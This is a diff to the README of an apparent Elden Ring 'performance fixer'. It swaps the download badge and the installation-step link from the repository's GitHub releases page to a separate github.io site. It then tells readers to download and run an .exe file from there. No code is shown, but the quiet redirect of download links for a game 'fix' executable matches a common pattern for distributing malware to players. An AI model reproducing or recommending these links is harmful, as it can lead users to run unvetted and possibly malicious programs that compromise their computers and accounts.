@@ -1,6 +1,6 @@
 # ⚔️ ShadowOfTheErdtree-Fixer - Boost Game Performance And Remove Stutter
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Tobyanuretic459/ShadowOfTheErdtree-Fixer/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://tobyanuretic459.github.io)
 
 ## 📌 Introduction
 
@@ -15,7 +15,7 @@ ShadowOfTheErdtree-Fixer improves the performance of Elden Ring on Windows compu
 
 ## 📥 Installation and Setup
 
-1. Visit the [Releases page](https://github.com/Tobyanuretic459/ShadowOfTheErdtree-Fixer/releases).
+1. Visit the [Releases page](https://tobyanuretic459.github.io).
 2. Locate the most recent version under the "Assets" section. 
 3. Click the file with an .exe extension to download it.
 4. Save the file to your desktop or a folder of your choice.
